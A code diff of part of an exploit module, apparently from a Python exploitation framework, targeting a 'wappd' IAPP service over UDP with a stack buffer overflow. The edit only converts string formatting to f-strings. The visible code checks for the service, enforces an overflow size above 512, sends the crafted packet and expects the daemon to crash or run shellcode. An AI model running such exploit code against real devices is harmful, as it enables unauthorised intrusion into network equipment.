@@ -107,7 +107,7 @@ class Exploit(BaseExploit):
 
     def run(self) -> None:
         if not self.check():
-            print_error("Target does not appear to have wappd IAPP service on UDP/{}".format(self.port))
+            print_error(f"Target does not appear to have wappd IAPP service on UDP/{self.port}")
             return
 
         print_success("wappd IAPP service confirmed — sending stack overflow payload")
@@ -150,22 +150,20 @@ class Exploit(BaseExploit):
     def _exploit(self) -> None:
         if self.overflow_size <= 512:
             print_error(
-                "overflow_size ({}) must exceed 512 to overflow the stack buffer — "
-                "set a value > 512".format(self.overflow_size)
+                f"overflow_size ({self.overflow_size}) must exceed 512 to overflow the stack buffer — "
+                "set a value > 512"
             )
             return
 
         packet = self._build_iapp_add_notify(self.overflow_size)
         print_status(
-            "Sending IAPP_ADD_NOTIFY overflow packet ({} bytes total) to {}:{}".format(
-                len(packet), self.target, self.port
-            )
+            f"Sending IAPP_ADD_NOTIFY overflow packet ({len(packet)} bytes total) to {self.target}:{self.port}"
         )
 
         response = self._send_udp(packet)
 
         if response:
-            print_info("Response received ({} bytes) — target may have processed packet".format(len(response)))
+            print_info(f"Response received ({len(response)} bytes) — target may have processed packet")
         else:
             print_status("No response (expected for a crashed/shellcode-executing daemon)")
 
